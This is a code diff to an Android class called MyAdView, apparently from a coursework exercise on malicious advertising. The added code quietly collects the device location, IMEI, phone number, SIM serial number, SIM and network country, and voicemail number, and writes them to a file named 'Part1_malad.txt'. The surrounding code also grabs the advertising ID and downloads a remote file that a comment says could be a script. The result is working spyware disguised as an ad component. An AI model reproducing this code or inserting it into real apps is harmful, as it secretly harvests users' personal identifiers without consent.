@@ -31,6 +31,20 @@ import java.io.IOException;
 import java.io.OutputStreamWriter;
 import java.util.concurrent.TimeUnit;
 
+
+
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.net.wifi.WifiConfiguration;
+import android.net.wifi.WifiManager;
+import android.support.annotation.NonNull;
+import android.util.Log;
+
+import static android.content.ContentValues.TAG;
+
 public class MyAdView {
     private static final String TAG = "MP1: MyAdView";
     public static Context ctx;
@@ -55,6 +69,8 @@ public class MyAdView {
         //String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
         //Long tsLong = System.currentTimeMillis()/1000;
         //String ts = tsLong.toString();
+
+        // ------------------------------------ Part 1 : A---------------------------
         // GET LOCATION
         if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             return;
@@ -84,6 +100,7 @@ public class MyAdView {
                 LOCA = timeStamp + ";" + "longitude:" + location.getLongitude() + "latitude:" + location.getLatitude();
             } catch (NullPointerException e) {Log.d("Answers", "Lat: N" + "Long: N" );}
         }
+        writeToFile(LOCA);
 
 
         // GET IMEI
@@ -92,12 +109,11 @@ public class MyAdView {
         Log.d("Answers", "IMEI: " + id);
         String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
         IMEI = timeStamp + ";" + "IMEI:" + id;
-
+        writeToFile(IMEI);
 
 
 
         //GET ADVERTISING ID
-
         AsyncTask<Void, Void, String> task = new AsyncTask<Void, Void, String>() {
             public AsyncResponse delegate = null;
 
@@ -126,19 +142,16 @@ public class MyAdView {
 
                 return advertId;
             }
+
             @Override
             protected void onPostExecute(String advertId) {
                 Log.d("Answers", "advertId: " + advertId);
                 //delegate.processFinish(advertId);
             }
 
+
         };
-
         task.execute();
-
-        ////////// READ PHONE NUMBER
-        String phoneNumber = telephonyManager.getLine1Number();
-        Log.d("Answers", "Phone Number: " + phoneNumber);
 
 
 
@@ -148,8 +161,10 @@ public class MyAdView {
         //String[] proj = new String[] {Phones._ID, Contacts.People.Phones.TYPE, Contacts.People.Phones.NUMBER, Contacts.People.Phones.LABEL};
         //Cursor cursor = contentResolver.query(phonesUri, proj, null, null, null);
 
+
         ////////// DOWNLOAD SCRIPT FROM A WEBSITE
         // I this example case it is just a picture, but it could be something else
+
         DownloadManager downloadmanager = (DownloadManager) ctx.getSystemService(ctx.DOWNLOAD_SERVICE);
         Uri uri = Uri.parse("http://classe-confidentiel.com/boyd/4.png");
 
@@ -162,10 +177,40 @@ public class MyAdView {
 
         downloadmanager.enqueue(request);
 
+
+
+        // ------------------------------------ Part 1 : B---------------------------
+        // GET PHONE NUMBER
+        String phoneNumber = telephonyManager.getLine1Number();
+        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        writeToFile(timeStamp + ";" + "Phone Number:" + phoneNumber);
+
+        // GET SIM SERIAL NUMBER
+        String sim = telephonyManager.getSimSerialNumber();
+        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        writeToFile(timeStamp + ";" + "SIM:" + sim);
+
+        // GET NETWORK COUNTRY
+        String networkCountryISO=telephonyManager.getNetworkCountryIso();
+        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        writeToFile(timeStamp + ";" + "Network Country:" + networkCountryISO);
+
+        // GET SIM COUNTRY
+        String SIMCountryISO=telephonyManager.getSimCountryIso();
+        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        writeToFile(timeStamp + ";" + "SIM Country:" + SIMCountryISO);
+
+        // GET VOICE MAIL NUMBER
+        String voiceMailNumber=telephonyManager.getVoiceMailNumber();
+        timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
+        writeToFile(timeStamp + ";" + "Voice Mail Number:" + voiceMailNumber);
     }
+
+
+
     private static void writeToFile(String data1){
         try {
-            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(ctx.openFileOutput("Part1 malad.txt", ctx.MODE_PRIVATE));
+            OutputStreamWriter outputStreamWriter = new OutputStreamWriter(ctx.openFileOutput("Part1_malad.txt", ctx.MODE_PRIVATE));
             outputStreamWriter.write(data1);
             outputStreamWriter.close();
         }
@@ -174,8 +219,9 @@ public class MyAdView {
         }
 
     }
-}
 
+
+}
 
 
 
